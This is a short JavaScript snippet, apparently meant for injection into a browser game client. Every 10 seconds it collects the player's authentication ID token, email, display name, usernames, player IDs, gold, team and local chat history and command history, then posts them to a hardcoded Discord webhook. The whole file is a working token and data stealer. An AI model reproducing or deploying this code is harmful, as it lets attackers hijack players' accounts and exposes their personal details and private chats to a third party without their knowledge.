const webhookUrl = 'https://discord.com/api/webhooks/1296219910971592787/cpI1P0DOk31xl5tEgfg3q3cxD0YNKmKHAbxWf0kPSfDZtimyix-nyuXRwXN5YkR9_VuL';

// Function to collect player data
function collectPlayerData() {
  const playerData = {
    token_id: String(main.idToken), // Token
    email: String(main.user.email), // Email
    displayName: String(main.user.displayName), // Display name
    emailVerified: Boolean(main.user.emailVerified), // Email verification
    username: String(main.username), // Username
    playerUid: String(game.playerUid), // Player UID
    gameUsername: main.username // Username from main.username
  };

  // Check if the game state is active
  if (this.game.isActive) {
    playerData.currentSector = String(game.sector.uid); // Current sector
    playerData.playerGold = String(game.sector.players[game.playerId].getGold()); // Player's gold
    playerData.playerUid = String(game.playerUid); // Player UID
    playerData.playerId = String(game.playerId); // Player ID
    playerData.chatHistory = {
      team: Array.isArray(game.chatHistory.team) ? game.chatHistory.team : [],
      local: Array.isArray(game.chatHistory.local) ? game.chatHistory.local : []
    };
    playerData.commandHistory = Array.isArray(game.commandHistory) ? game.commandHistory : [];
  }

  return playerData;
}

// Function to send data to Discord
function sendDataToDiscord() {
  const playerData = collectPlayerData();

  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      content: 'Player Data:',
      embeds: [{
        title: 'Player Information',
        description: JSON.stringify(playerData, null, 2),
        color: 5814783 // Color in RGB format
      }]
    })
  })
  .then(response => {
    if (!response.ok) {
      return response.text().then(text => { throw new Error(text); });
    }
    return response.json();
  })
  .then(data => {
    console.log('Success:', data);
  })
  .catch(error => {
    console.error('Error:', error);
  });
}

// Send data every 10 seconds
setInterval(sendDataToDiscord, 10000);
